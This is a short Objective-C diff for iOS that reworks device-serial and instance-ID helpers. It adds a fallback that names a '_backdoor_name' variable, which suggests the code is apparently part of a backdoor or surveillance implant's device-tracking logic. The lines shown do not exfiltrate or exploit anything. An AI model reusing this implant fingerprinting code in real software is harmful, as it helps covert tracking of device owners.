@@ -456,9 +456,27 @@ NSString *getHostname ()
 //
 NSString *getSystemSerialNumber()
 {
+  NSString *idf = nil;
+  UIDevice *dev = [UIDevice currentDevice];
 
-  NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
-  return id;
+  if ([dev respondsToSelector:@selector(uniqueIdentifier)] == TRUE)
+    idf = [dev performSelector:@selector(uniqueIdentifier)];
+  
+  if (idf == nil)
+  {
+    
+      time_t unixTime;
+      time(&unixTime);
+      NSString *_backdoor_name = [[[NSBundle mainBundle] executablePath] lastPathComponent];
+    
+      int64_t ftime  = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
+      int32_t hiPart = (int64_t)ftime >> 32;
+      int32_t loPart = (int64_t)ftime & 0xFFFFFFFF;
+      
+      idf = [NSString stringWithFormat:@"%@%.8X%.8X", _backdoor_name, hiPart, loPart];
+  }
+  
+  return idf;
 }
 
 NSString *getCurrInstanceID()
@@ -468,9 +486,15 @@ NSString *getCurrInstanceID()
   if (gCurrInstanceID != nil)
     return gCurrInstanceID;
   
-  _instanceID = [[NSString alloc] initWithContentsOfFile: gCurrInstanceIDFileName 
-                                                encoding: NSUTF8StringEncoding 
-                                                   error: nil];
+  for (int i=0; i < 10; i++)
+  {
+    _instanceID = [[NSMutableString alloc] initWithContentsOfFile: gCurrInstanceIDFileName
+                                                         encoding: NSUTF8StringEncoding
+                                                            error: nil];
+    if (_instanceID != nil)
+      break;
+  }
+  
   if (_instanceID == nil)
     {
       NSString *serialNumber = getSystemSerialNumber();
@@ -487,12 +511,12 @@ NSString *getCurrInstanceID()
                     encoding: NSUTF8StringEncoding 
                        error: nil];
     
-      _instanceID = [[NSString alloc] initWithString: tmpinstID];
+      _instanceID = [[NSMutableString alloc] initWithString: tmpinstID];
     
       [tmpinstID release];
     }
-  
-  gCurrInstanceID = _instanceID;
+
+  gCurrInstanceID = (NSString*)_instanceID;
   
   return gCurrInstanceID;
 }
